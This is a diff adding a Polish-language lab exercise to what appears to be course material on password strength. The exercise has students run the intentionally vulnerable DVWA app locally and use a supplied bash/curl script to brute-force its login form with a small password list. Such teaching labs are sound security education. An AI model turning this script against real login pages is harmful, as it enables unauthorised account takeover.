@@ -37,3 +37,65 @@ Oblicz liczbę kombinacji dla hasła 12-znakowego, gdy używamy:
 - Małych i dużych liter + znaków specjalnych + cyfr.
 
 Pytanie dodatkowe: O ile rzędów wielkości najsilniejsze hasło (wariant 4) jest słabsze od frazy seed ($3,4 \times 10^{38}$)?
+
+### ZAD 4 Prosty atak brute force
+W poniższym zadaniu użyjemy ataku brute force na aplikacje dvwa
+
+Uruchom aplikacje
+```
+docker run --rm -it -p 80:80 vulnerables/web-dvwa
+```
+Wejdź na adres localhost
+Zaloguj się admin password
+Kliknij setup -> reset database
+Zaloguj się admin password
+Przejdź do zakładki brute force lub pod link http://localhost/vulnerabilities/brute/
+Spróbuj się zalogować
+---
+Utworz prosty plik txt
+```
+echo "password" >> pass.txt
+echo "1234" >> pass.txt
+echo "67pass" >> pass.txt
+echo "gsfAdz" > pass.txt
+```
+
+Napisz skrypt który będzie atakował bruteforcem link http://localhost/vulnerabilities/brute/
+
+Lub użyj gotowego
+```
+nano script.sh
+```
+Wklej poniższy kod
+```
+#!/bin/bash
+
+URL="http://localhost/vulnerabilities/brute/"
+COOKIE="security=low; PHPSESSID=<TWOJE_CIASTECZKO>"
+USERNAME="admin"
+PASSFILE="pass.txt"
+
+while read password; do
+    response=$(curl -s -b "$COOKIE" "$URL?username=$USERNAME&password=$password&Login=Login")
+    if echo "$response" | grep -q "incorrect"; then
+        echo "[-] FAILED: $USERNAME:$password"
+    else
+        echo "[+] FOUND: $USERNAME:$password"
+    fi
+done < "$PASSFILE"
+```
+URL - link to formularza z loginem
+COOKIE - Pozyskaj je wchodząc do konsoli i kopiują wartość z PHPSESSID np.
+```
+COOKIE="security=low; PHPSESSID=uajef67tv5p9173593cdtp9id6"
+```
+USERNAME - nazwa użytkownika którego łamiemy
+PASSFILE - plik ze słownikiem haseł
+
+Uruchom skrypt
+```
+chmod +x script.sh
+./script.sh
+```
+
+
